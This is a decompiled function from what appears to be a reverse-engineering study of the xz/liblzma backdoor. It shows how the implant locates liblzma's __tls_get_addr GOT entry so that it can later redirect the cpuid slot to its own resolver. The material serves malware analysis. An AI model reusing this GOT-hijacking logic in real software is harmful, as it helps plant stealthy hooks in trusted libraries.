// /home/kali/xzre-ghidra/xzregh/103FA0_update_got_address.c
// Function: update_got_address @ 0x103FA0
// Calling convention: unknown
// Prototype: undefined update_got_address(void)


/*
 * AutoDoc: Disassembles liblzma's `__tls_get_addr` PLT stub, accounts for the short/long JMP encodings,
 * and then computes the true GOT entry by applying the stub's 32-bit displacement. The resulting
 * pointer is cached in `ctx->got_ctx.got_ptr` and later consumed when swapping the cpuid GOT slot
 * over to the implant's resolver.
 */
#include "xzre_types.h"


void update_got_address(long param_1)

{
  long lVar1;
  ulong uVar2;
  long lVar3;
  long lVar4;
  void *got_entry;
  long reloc_offset;
  ulong jump_flags;
  void *plt_entry;
  
  get_tls_get_addr_random_symbol_got_offset();
  lVar1 = _Llzma_block_uncomp_encode_0 - *(long *)(param_1 + 0x20);
  *(undefined8 *)(param_1 + 0x10) = 0;
  *(undefined8 *)(param_1 + 0x18) = 0;
  uVar2 = (ulong)(*(char *)((long)&_Lx86_coder_destroy + lVar1 + 1) == '\x0f');
  lVar3 = uVar2 * 4;
  if (*(char *)((long)&_Lx86_coder_destroy + uVar2 * 4 + lVar1) == -0xe) {
    lVar3 = lVar3 + 1;
  }
  lVar4 = 0;
  if ((ulong)(*(ushort *)((long)&_Lx86_coder_destroy + lVar3 + lVar1) + 1 & 0xffff) ==
      *(ulong *)(param_1 + 8)) {
    lVar4 = (long)&_Lx86_coder_destroy +
            lVar3 + -0x12 + (ulong)*(uint *)((long)&_Lx86_coder_destroy + lVar3 + lVar1 + 2) + lVar1
    ;
  }
  *(long *)(param_1 + 8) = lVar4;
  return;
}

